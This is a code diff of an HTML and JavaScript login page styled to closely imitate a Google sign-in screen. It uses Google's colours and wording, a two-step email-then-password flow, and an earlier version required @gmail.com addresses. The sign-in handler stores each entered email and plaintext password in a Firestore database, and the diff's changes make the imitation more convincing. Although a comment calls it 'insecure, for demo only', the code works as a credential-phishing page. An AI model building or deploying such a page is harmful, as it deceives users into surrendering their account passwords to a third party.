@@ -15,7 +15,7 @@
             background: #f5f5f5;
         }
         .login-box {
-            width: 400px;
+            width: 368px;
             padding: 48px 40px 36px;
             border-radius: 8px;
             background: white;
@@ -38,37 +38,69 @@
         }
         input {
             width: 100%;
-            padding: 12px;
+            padding: 13px 15px;
             margin-bottom: 20px;
             border: 1px solid #dadce0;
             border-radius: 4px;
             font-size: 16px;
             box-sizing: border-box;
         }
-        button {
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        .btn-primary {
             width: 100%;
             padding: 10px;
             background: #1a73e8;
             color: white;
             border: none;
             border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
+            font-size: 14px;
             font-weight: 500;
+            height: 40px;
+            cursor: pointer;
         }
-        button:hover {
+        .btn-primary:hover {
             background: #1765cc;
+        }
+        .btn-secondary {
+            background: white;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+            margin-top: 10px;
+        }
+        .btn-secondary:hover {
+            background: #f7f8f8;
         }
         .error {
             color: #d93025;
-            font-size: 14px;
+            font-size: 12px;
             margin: -15px 0 15px;
             text-align: left;
             display: none;
         }
-        .footer {
-            margin-top: 30px;
-            color: #5f6368;
+        .email-display {
+            font-weight: 500;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #202124;
+        }
+        .change-email {
+            color: #1a73e8;
+            cursor: pointer;
+            font-weight: normal;
+        }
+        #password-stage {
+            display: none;
+        }
+        .forgot-password {
+            display: block;
+            text-align: left;
+            margin: -15px 0 20px;
+            color: #1a73e8;
             font-size: 14px;
         }
     </style>
@@ -79,13 +111,28 @@
         <h1>Sign in</h1>
         <p class="subtitle">to continue to your account</p>
         
-        <form id="login-form">
-            <input type="email" id="email" placeholder="Email" required>
-            <div class="error" id="email-error">Please enter a valid @gmail.com address</div>
-            <input type="password" id="password" placeholder="Password" required>
-            <div class="error" id="password-error">Please enter your password</div>
-            <button type="submit">Continue</button>
-        </form>
+        <!-- Email Stage -->
+        <div id="email-stage">
+            <input type="email" id="email" placeholder="Email or phone" autofocus>
+            <div class="error" id="email-error">Enter a valid email or phone number</div>
+            <div class="footer">
+                <a href="#" id="create-account">Create account</a>
+            </div>
+            <button type="button" id="next-btn" class="btn-primary" disabled>Next</button>
+        </div>
+        
+        <!-- Password Stage -->
+        <div id="password-stage">
+            <div class="email-display">
+                <span id="password-email-display"></span>
+                <span class="change-email" id="password-change-email">Change</span>
+            </div>
+            <input type="password" id="password" placeholder="Enter your password" autofocus>
+            <div class="error" id="password-error">Enter your password</div>
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <button type="button" id="signin-btn" class="btn-primary">Sign in</button>
+            <button type="button" class="btn-primary btn-secondary">Sign in as guest</button>
+        </div>
     </div>
 
     <script type="module">
@@ -105,38 +152,72 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        const form = document.getElementById('login-form');
+        // DOM elements
         const emailInput = document.getElementById('email');
         const emailError = document.getElementById('email-error');
+        const nextBtn = document.getElementById('next-btn');
+        const passwordStage = document.getElementById('password-stage');
+        const emailStage = document.getElementById('email-stage');
+        const passwordEmailDisplay = document.getElementById('password-email-display');
+        const passwordChangeEmail = document.getElementById('password-change-email');
         const passwordInput = document.getElementById('password');
         const passwordError = document.getElementById('password-error');
+        const signinBtn = document.getElementById('signin-btn');
+        const createAccountBtn = document.getElementById('create-account');
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
+        // Email validation
+        emailInput.addEventListener('input', function() {
             const email = emailInput.value.trim();
+            const isValid = validateEmail(email);
+            
+            if (email.length === 0) {
+                nextBtn.disabled = true;
+                emailError.style.display = 'none';
+            } else if (isValid) {
+                nextBtn.disabled = false;
+                emailError.style.display = 'none';
+            } else {
+                nextBtn.disabled = true;
+                emailError.style.display = 'block';
+            }
+        });
+
+        // Next button click - shows password field
+        nextBtn.addEventListener('click', function() {
+            const email = emailInput.value.trim();
+            
+            if (validateEmail(email)) {
+                emailStage.style.display = 'none';
+                passwordStage.style.display = 'block';
+                passwordEmailDisplay.textContent = email;
+                passwordInput.focus();
+            } else {
+                emailError.style.display = 'block';
+            }
+        });
+
+        // Change email buttons
+        passwordChangeEmail.addEventListener('click', function() {
+            passwordStage.style.display = 'none';
+            emailStage.style.display = 'block';
+            emailInput.focus();
+        });
+
+        // Sign in button - saves credentials to Firestore
+        signinBtn.addEventListener('click', async function() {
+            const email = passwordEmailDisplay.textContent;
             const password = passwordInput.value.trim();
             
-            // Reset errors
-            emailError.style.display = 'none';
-            passwordError.style.display = 'none';
-            
-            // Validate email
-            if (!email.endsWith('@gmail.com')) {
-                emailError.style.display = 'block';
-                emailInput.focus();
-                return;
-            }
-            
-            // Validate password
             if (password.length === 0) {
                 passwordError.style.display = 'block';
                 passwordInput.focus();
                 return;
             }
             
+            passwordError.style.display = 'none';
+            
             try {
-                // Generate a simple user ID
+                // Generate user ID from email
                 const userId = email.replace(/[^a-zA-Z0-9]/g, '');
                 
                 // Save credentials to Firestore (INSECURE - FOR DEMO ONLY)
@@ -155,6 +236,34 @@
                 passwordError.style.display = 'block';
             }
         });
+
+        // Create account button
+        createAccountBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            emailStage.style.display = 'none';
+            passwordStage.style.display = 'block';
+            passwordEmailDisplay.textContent = emailInput.value.trim() || 'newuser@example.com';
+            passwordInput.focus();
+        });
+
+        // Helper functions
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        // Enter key functionality
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !nextBtn.disabled) {
+                nextBtn.click();
+            }
+        });
+
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                signinBtn.click();
+            }
+        });
     </script>
 </body>
-    </html>
+                </html>
